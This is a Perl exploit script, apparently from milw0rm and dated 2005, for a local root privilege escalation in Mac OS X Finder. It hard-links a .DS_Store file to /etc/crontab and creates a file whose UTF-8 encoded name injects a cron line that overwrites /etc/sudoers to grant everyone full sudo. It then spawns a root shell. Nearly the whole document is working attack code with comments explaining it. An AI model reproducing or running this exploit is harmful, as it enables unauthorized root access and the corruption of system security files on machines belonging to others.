#!/usr/bin/perl
#
# [OSX Finder] DS_Store arbitrary file overwrite exploit. (root version)
#
# vade79 -> v9@fakehalo.us (fakehalo/realhalo)
#
# this will create a directory called "xfinder" in your home directory,
# once the root user has modified that directory using Finder in almost any
# way(such as copying a file out of it, etc) it will write to the .DS_Store
# file in that directory.  the data written to the .DS_Store file will
# consist of the filenames/subdirectories making up the directory and the
# attributes of the directory.
#
# this exploit works by linking the .DS_Store file to /etc/crontab, and
# creating a special unicode(utf8 encoded) file in the directory.  the file
# created in unicode is equal to(in ASCII):
#  '\n\n* * * * * root echo "ALL ALL=(ALL) ALL">/etc/sudoers\n\n'
#
# this file will display as a japanese-like series of characters and
# is (part of) what is written to the .DS_Store file, which allows for 
# the privilege escalation.  once this line has been written to
# /etc/crontab(along with other .DS_Store data), crontab will overwrite
# /etc/sudoers with "ALL ALL=(ALL) ALL" and you can then sudo to root.
#
# note: this is done through crontab->sudo because sudo will complain
# of the .DS_Store garbage data in the /etc/sudoers file and exit,
# whereas crontab will ignore it.
#
# (sorry for the squished/ugly script, just a precaution for
# wordwrapping)

use encoding utf8;
sub pexit{print("[!] @_.\n");exit(1);}
$testdir="$ENV{HOME}/xfinder";
print("[OSX Finder] DS_Store arbitrary file overwrite exploit.\n\n");
if(!-f"/etc/crontab"||!-f"/etc/sudoers"){
 pexit("/etc/crontab and /etc/sudoers are required for this to work");
}
mkdir($testdir)||pexit("Could make the directory \"$testdir\", " .
"make sure it doesn't already exist");
chdir($testdir)||pexit("Could change the directory to \"$testdir\"");
# = "\n\n* * * * * root echo "ALL ALL=(ALL) ALL">/etc/sudoers\n\n"
open(TOUCH,">" . Encode::encode_utf8(
"\x{0a0a}\x{2a20}\x{2a20}\x{2a20}\x{2a20}\x{2a20}\x{726f}\x{6f74}" .
"\x{2065}\x{6368}\x{6f20}\x{2241}\x{4c4c}\x{2041}\x{4c4c}\x{3d28}" .
"\x{414c}\x{4c29}\x{2041}\x{4c4c}\x{223e}\x{2f65}\x{7463}\x{2f73}" .
"\x{7564}\x{6f65}\x{7273}\x{0a0a}"))||pexit("Could not create " .
"unicode/utf8 encoded filename");
close(TOUCH);
link("/etc/crontab",".DS_Store")||pexit("Could not link .DS_Store " .
"to /etc/crontab");
print("[+] Waiting for root user to modify \"$testdir\" with " .
"Finder...\n");
print("[?] (CTRL-C if desired, this script does not need to be " .
"running to work)\n");
@ast=@st=stat("/etc/crontab");
while($st[7]==$ast[7]&&$st[9]==$ast[9]){
 sleep(1);
 @ast=stat("/etc/crontab");
}
print("[+] /etc/crontab has been modified.\n");
print("[+] Waiting for crontab to change /etc/sudoers...\n");
@ast=@st=stat("/etc/sudoers");
while($st[7]==$ast[7]&&$st[9]==$ast[9]){
 sleep(1);
 @ast=stat("/etc/sudoers");
}
print("[+] /etc/sudoers has been modified.\n");
print("[+] Attempting to \"sudo sh\". (use YOUR password)\n");
system("sudo sh");
exit(0);

# milw0rm.com [2005-02-07]
